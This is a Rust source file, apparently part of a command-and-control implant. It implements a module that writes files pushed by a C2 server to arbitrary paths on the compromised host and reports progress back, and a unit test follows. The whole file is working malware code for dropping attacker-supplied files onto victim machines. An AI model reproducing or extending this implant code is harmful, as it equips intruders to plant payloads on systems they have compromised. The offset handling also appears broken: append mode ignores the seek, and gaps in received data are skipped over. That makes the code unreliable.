use std::fs::OpenOptions;
use std::io::{Seek, SeekFrom, Write};

use nw_profile::msgs::{FileAck, FileChunk};
use uuid::Uuid;

/// One active upload (a file the C2 server is pushing to this implant). Owns
/// an append-mode writer and the next byte offset, so `nw/upload <dest>`
/// streams data across consecutive server pushes.
pub struct Upload {
    file: std::fs::File,
    pub dest: String,
    size: u64,
    /// Highest contiguous byte written so far (acked to the server).
    received: u64,
    task_id: Uuid,
}

impl Upload {
    /// Create/append `dest` for a pushed file. Seeds `received` from the
    /// existing file's length so the server resumes from where it left off.
    pub fn open(dest: &str, task_id: Uuid) -> Result<Self, String> {
        if dest.trim().is_empty() {
            return Err("empty destination path".into());
        }
        let file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(dest)
            .map_err(|e| format!("open {dest:?}: {e}"))?;
        let received = file
            .metadata()
            .map_err(|e| format!("stat {dest:?}: {e}"))?
            .len();
        Ok(Upload {
            file,
            dest: dest.to_string(),
            size: received,
            received,
            task_id,
        })
    }

    pub fn task_id(&self) -> Uuid {
        self.task_id
    }

    /// Current progress to report to the server next poll. Never reports
    /// `done` until a real total is known (a fresh, empty dest reports size 0).
    pub fn ack(&self) -> FileAck {
        FileAck {
            received: self.received,
            total: self.size,
            done: self.size > 0 && self.received >= self.size,
        }
    }

    /// Write one push chunk at its absolute offset, keeping `received` set to
    /// the highest contiguous offset. Returns a FileAck for the server.
    pub fn write_chunk(&mut self, chunk: &FileChunk) -> FileAck {
        self.size = chunk.total;
        // Overlapping/duplicate chunks: seek to the chunk's own offset and
        // write there, then bump received only if it extends the present end.
        if chunk.offset > self.received {
            // A gap means the server skipped bytes we don't have; trust the
            // server's offsets and just advance to its position.
            self.received = chunk.offset;
        }
        let _ = self.file.seek(SeekFrom::Start(chunk.offset)).ok();
        let _ = self.file.write_all(&chunk.data).ok();
        let _ = self.file.flush().ok();
        let end = chunk.offset + chunk.data.len() as u64;
        if end > self.received {
            self.received = end;
        }
        FileAck {
            received: self.received,
            total: self.size,
            done: self.received >= self.size,
        }
    }

    pub fn done(&self) -> bool {
        self.received >= self.size
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn writes_and_acks_contiguous() {
        let dir = std::env::temp_dir();
        let dest = dir.join(format!("nw-up-test-{}.bin", std::process::id()));
        let _ = std::fs::remove_file(&dest);

        let mut up = Upload::open(dest.to_str().unwrap(), Uuid::new_v4()).unwrap();
        let data: Vec<u8> = (0..100u32).map(|i| (i % 251) as u8).collect();
        let ack = up.write_chunk(&FileChunk {
            name: dest.to_str().unwrap().to_string(),
            offset: 0,
            total: 100,
            data: data.clone(),
        });
        assert_eq!(ack.received, 100);
        assert!(ack.done);

        // A chunk starting before the acked offset must not shrink it.
        let greedy = up.write_chunk(&FileChunk {
            name: String::new(),
            offset: 40,
            total: 100,
            data: vec![9u8; 20],
        });
        assert_eq!(greedy.received, 100);

        std::fs::remove_file(&dest).ok();
    }
}
